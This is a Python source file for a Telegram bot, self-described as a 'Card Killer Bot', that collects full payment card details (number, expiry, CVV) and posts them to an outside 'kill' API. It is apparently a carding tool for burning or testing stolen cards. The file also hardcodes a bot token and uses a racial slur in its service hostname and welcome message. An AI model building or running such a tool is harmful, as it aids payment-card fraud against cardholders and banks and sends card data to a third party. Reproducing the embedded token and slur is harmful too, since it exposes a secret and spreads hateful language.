# @diwazz

import requests
import telebot
import re

BOT_TOKEN = '7940592372:AAEE-lGXj8GKQGQ7H76DD6Cljw6FJSPfiRU'
API_URL = "https://nigga-killer.onrender.com/kill" 

bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, """<b>Welcome! Nigga  @diwazz Card Killer Bot.</b>

Use <code>/kill CC|MM|YY|CVV</code> to start the process.""", parse_mode='HTML')

@bot.message_handler(commands=['kill'])
def handle_kill_command(message):
    try:
        command_text = message.text.split(' ', 1)[1]
    except IndexError:
        bot.reply_to(message, "<b>Please provide card details.</b>", parse_mode='HTML')
        return
    match = re.match(r'(\d{16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})', command_text)
    if not match:
        bot.reply_to(message, "<b>Invalid format. Use:</b> <code>CC|MM|YY|CVV</code>", parse_mode='HTML')
        return
    full_cc_string = match.group(0)
    sent_message = bot.reply_to(message, f"<i>Kill process initiated for <code>{full_cc_string}</code>. This may take several minutes...</i>", parse_mode='HTML')
    payload = {'chat_id': message.chat.id, 'message_id': sent_message.message_id, 'card': full_cc_string}
    try:
        response = requests.post(API_URL, json=payload, timeout=15)
        if response.status_code != 200:
            bot.edit_message_text(f"<b>Error:</b> API rejected the request. Status: {response.status_code}", chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    except requests.exceptions.RequestException as e:
        bot.edit_message_text(f"<b>Error:</b> Could not send request to API. <code>{e}</code>", chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')

bot.polling()
  
